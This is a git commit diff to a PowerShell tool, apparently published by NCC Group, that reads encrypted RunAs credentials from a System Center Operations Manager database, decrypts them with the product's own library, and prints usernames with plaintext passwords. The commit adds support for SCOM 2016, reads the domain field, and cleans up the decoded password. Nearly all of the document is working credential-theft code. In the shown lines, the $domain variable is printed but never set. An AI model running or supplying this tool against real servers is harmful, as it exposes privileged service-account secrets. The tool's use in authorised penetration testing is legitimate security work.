a746f5666f932242d6a731ebf05e7074c3e45822
Rich Warren <richpwarren@gmail.com>
2018-02-11 15:57:53 +0000

    Update Invoke-SCOMDecrypt.ps1
    Fixes issue #1, adding suggested version detection, domain extraction and password cleanup. Thanks @LostLogic !

--- SCOMDecrypt/Invoke-SCOMDecrypt.ps1
+++ SCOMDecrypt/Invoke-SCOMDecrypt.ps1
@@ -1,4 +1,4 @@
-﻿<#
+<#
 Released as open source by NCC Group Plc - http://www.nccgroup.com/
 
 Developed by Richard Warren, richard dot warren at nccgroup dot trust
@@ -11,8 +11,24 @@ Released under AGPL see LICENSE for more information
 
 
 function Invoke-SCOMDecrypt {
-	[System.Reflection.Assembly]::LoadFile("C:\Program Files\Microsoft System Center 2012 R2\Operations Manager\Server\Microsoft.Mom.Sdk.SecureStorageManager.dll") | Out-Null
-	[System.Reflection.Assembly]::LoadFile("C:\Program Files\Microsoft System Center 2012 R2\Operations Manager\Server\Microsoft.EnterpriseManagement.DataAccessLayer.dll") | Out-Null
+
+	# Check if SCOM 2016 is installed	
+	if(Test-Path "C:\Program Files\Microsoft System Center 2016")
+	{
+		[System.Reflection.Assembly]::LoadFile("C:\Program Files\Microsoft System Center 2016\Operations Manager\Server\Microsoft.Mom.Sdk.SecureStorageManager.dll") | Out-Null 
+		[System.Reflection.Assembly]::LoadFile("C:\Program Files\Microsoft System Center 2016\Operations Manager\Server\Microsoft.EnterpriseManagement.DataAccessLayer.dll") | Out-Null
+	}
+	elseif(Test-Path "C:\Program Files\Microsoft System Center 2012 R2")
+	{
+		[System.Reflection.Assembly]::LoadFile("C:\Program Files\Microsoft System Center 2012 R2\Operations Manager\Server\Microsoft.Mom.Sdk.SecureStorageManager.dll") | Out-Null
+		[System.Reflection.Assembly]::LoadFile("C:\Program Files\Microsoft System Center 2012 R2\Operations Manager\Server\Microsoft.EnterpriseManagement.DataAccessLayer.dll") | Out-Null
+	}
+	else
+	{
+		Write-Host "[!] Unable to find installation directory of SCOM 2012 R2 or 2016"
+		return
+	}
+
 	$scom = New-Object Microsoft.EnterpriseManagement.Security.SecureStorageManager
 	$server = $null
 	$database = $null
@@ -41,7 +57,7 @@ function Invoke-SCOMDecrypt {
 		return
 	}
 	
-	$sqlCommand = "SELECT UserName, Data FROM dbo.CredentialManagerSecureStorage;"
+	$sqlCommand = "SELECT UserName, Data, Domain FROM dbo.CredentialManagerSecureStorage;"
 	$connectionString = "Server=$server;Database=$database;Trusted_Connection=True;"
 	$connection = new-object system.data.SqlClient.SQLConnection($connectionString)
 	$command = new-object system.data.sqlclient.sqlcommand($sqlCommand,$connection)
@@ -53,11 +69,29 @@ function Invoke-SCOMDecrypt {
 	
 	for($i=0;$i -lt $dataset.Tables[0].Rows.Count;$i++)
 	{ 
-	if($dataset.Tables[0].Rows[$i].Data -ne [System.DBNull]::Value -and $dataset.Tables[0].Rows[$i].Username -ne [System.DBNull]::Value)
+		if($dataset.Tables[0].Rows[$i].Data -ne [System.DBNull]::Value -and $dataset.Tables[0].Rows[$i].Username -ne [System.DBNull]::Value)
 		{
-		$passw = [System.Text.Encoding]::UTF8.GetString($scom.Decrypt($dataset.Tables[0].Rows[$i].Data))
-		$user = $dataset.Tables[0].Rows[$i].Username
-		Write-Host "[+] $user : $passw"
+			$user = $dataset.Tables[0].Rows[$i].Username
+			$passw = [System.Text.Encoding]::UTF8.GetString($scom.Decrypt($dataset.Tables[0].Rows[$i].Data))
+			
+			# Cleans up the spaces in the password
+			$truePass = ""
+			for($j = 0; $j -lt $passw.Length; $j++)
+			{
+				if($j % 2 -eq 0)
+				{
+					$truePass += $passw[$j]
+				}
+			}
+			
+			if($domain -notlike "")
+			{
+				Write-Host "[+] $domain\$user : $truePass"
+			}
+			else
+			{
+				Write-Host "[+] $user : $truePass"
+			}
 		}
 	}
 }
